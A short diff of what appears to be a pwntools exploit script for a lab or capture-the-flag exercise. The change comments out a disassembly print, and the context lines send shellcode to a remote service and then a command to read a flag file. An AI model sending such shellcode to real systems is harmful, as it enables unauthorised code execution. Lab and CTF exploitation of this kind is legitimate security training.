@@ -35,7 +35,7 @@ shellcode = asm(
 """
 )
 
-print(disasm(shellcode))
+# print(disasm(shellcode))
 r = remote("10.113.184.121", 10042)
 r.sendline(shellcode)
 r.sendline(b"cat /home/lab/flag")
